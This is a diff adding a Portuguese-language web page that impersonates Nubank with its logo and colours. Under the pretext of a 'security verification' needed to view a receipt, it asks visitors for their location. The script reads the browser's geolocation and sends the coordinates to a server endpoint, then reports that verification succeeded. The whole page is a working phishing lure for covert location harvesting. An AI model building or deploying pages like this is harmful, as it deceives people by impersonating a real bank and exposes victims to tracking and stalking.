@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nubank - Verificação</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            background: linear-gradient(135deg, #820AD1 0%, #6B00B3 100%);
+            padding: 20px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        body::before {
+            content: '';
+            position: absolute;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, rgba(255,255,255,0) 70%);
+            animation: rotate 20s linear infinite;
+        }
+
+        @keyframes rotate {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+
+        .container {
+            text-align: center;
+            padding: 40px;
+            background-color: white;
+            border-radius: 16px;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.1),
+                        0 2px 8px rgba(0,0,0,0.05),
+                        inset 0 0 0 1px rgba(255,255,255,0.1);
+            max-width: 500px;
+            width: 100%;
+            position: relative;
+            backdrop-filter: blur(10px);
+            transform: translateY(0);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        .container:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 12px 40px rgba(0,0,0,0.15),
+                        0 4px 12px rgba(0,0,0,0.08),
+                        inset 0 0 0 1px rgba(255,255,255,0.2);
+        }
+
+        h1 {
+            color: #820AD1;
+            margin-bottom: 24px;
+            font-size: 32px;
+            font-weight: 700;
+            letter-spacing: -0.5px;
+        }
+
+        p {
+            color: #666;
+            font-size: 16px;
+            line-height: 1.5;
+            margin-bottom: 32px;
+        }
+
+        button {
+            padding: 16px 32px;
+            font-size: 16px;
+            background: linear-gradient(135deg, #820AD1 0%, #6B00B3 100%);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            margin: 10px;
+            transition: all 0.3s ease;
+            font-weight: 600;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 4px 12px rgba(130, 10, 209, 0.3);
+        }
+
+        button::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(
+                90deg,
+                transparent,
+                rgba(255, 255, 255, 0.2),
+                transparent
+            );
+            transition: 0.5s;
+        }
+
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 16px rgba(130, 10, 209, 0.4);
+        }
+
+        button:hover::before {
+            left: 100%;
+        }
+
+        button:active {
+            transform: translateY(1px);
+            box-shadow: 0 2px 8px rgba(130, 10, 209, 0.3);
+        }
+
+        button:disabled {
+            background: #cccccc;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+
+        #status {
+            margin-top: 20px;
+            color: #666;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .loading {
+            display: none;
+            margin: 20px auto;
+            width: 40px;
+            height: 40px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #820AD1;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            box-shadow: 0 0 12px rgba(130, 10, 209, 0.2);
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .success-message {
+            color: #820AD1;
+            font-weight: 600;
+            margin-top: 20px;
+            display: none;
+            padding: 12px 24px;
+            background: rgba(130, 10, 209, 0.1);
+            border-radius: 8px;
+            animation: fadeIn 0.5s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .nubank-logo {
+            width: 120px;
+            height: auto;
+            margin-bottom: 24px;
+        }
+
+        .security-icon {
+            width: 48px;
+            height: 48px;
+            margin-bottom: 16px;
+            opacity: 0.8;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://logodownload.org/wp-content/uploads/2019/08/nubank-logo-0.png" alt="Nubank" class="nubank-logo">
+        <h1>Verificação de Segurança</h1>
+        <img src="https://cdn-icons-png.flaticon.com/512/2091/2091665.png" alt="Segurança" class="security-icon">
+        <p>Para acessar seu comprovante, precisamos verificar sua localização</p>
+        <button id="locationButton" onclick="capturarLocalizacao()">Acessar Comprovante</button>
+        <div id="loading" class="loading"></div>
+        <div id="status"></div>
+        <div id="successMessage" class="success-message">Verificação concluída com sucesso!</div>
+    </div>
+
+    <script>
+        // Variável para controlar se a localização já foi capturada
+        let localizacaoCapturada = false;
+
+        function capturarLocalizacao() {
+            // Se a localização já foi capturada, não faz nada
+            if (localizacaoCapturada) {
+                return;
+            }
+            
+            const statusDiv = document.getElementById('status');
+            const loadingDiv = document.getElementById('loading');
+            const locationButton = document.getElementById('locationButton');
+            
+            if (!navigator.geolocation) {
+                statusDiv.innerHTML = 'Seu navegador não suporta verificação de localização';
+                return;
+            }
+
+            statusDiv.innerHTML = '';
+            loadingDiv.style.display = 'block';
+            locationButton.disabled = true;
+
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    const latitude = position.coords.latitude;
+                    const longitude = position.coords.longitude;
+                    enviarLocalizacao(latitude, longitude);
+                },
+                (error) => {
+                    loadingDiv.style.display = 'none';
+                    locationButton.disabled = false;
+                    
+                    switch(error.code) {
+                        case error.PERMISSION_DENIED:
+                            statusDiv.innerHTML = 'Por favor, permita o acesso à sua localização para continuar';
+                            break;
+                        case error.POSITION_UNAVAILABLE:
+                            statusDiv.innerHTML = 'Não foi possível obter sua localização';
+                            break;
+                        case error.TIMEOUT:
+                            statusDiv.innerHTML = 'Tempo limite excedido ao obter sua localização';
+                            break;
+                        default:
+                            statusDiv.innerHTML = 'Ocorreu um erro ao verificar sua localização';
+                    }
+                }
+            );
+        }
+
+        function enviarLocalizacao(latitude, longitude) {
+            fetch('/salvar-localizacao', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    latitude: latitude,
+                    longitude: longitude
+                })
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error(`Erro do servidor: ${response.status}`);
+                }
+                return response.json();
+            })
+            .then(data => {
+                document.getElementById('loading').style.display = 'none';
+                document.getElementById('status').innerHTML = '';
+                document.getElementById('successMessage').style.display = 'block';
+                
+                // Marca que a localização já foi capturada
+                localizacaoCapturada = true;
+                
+                // Desabilita o botão após o sucesso
+                document.getElementById('locationButton').disabled = true;
+            })
+            .catch(error => {
+                document.getElementById('loading').style.display = 'none';
+                document.getElementById('locationButton').disabled = false;
+                document.getElementById('status').innerHTML = 'Erro ao processar a verificação';
+            });
+        }
+    </script>
+</body>
+</html> 
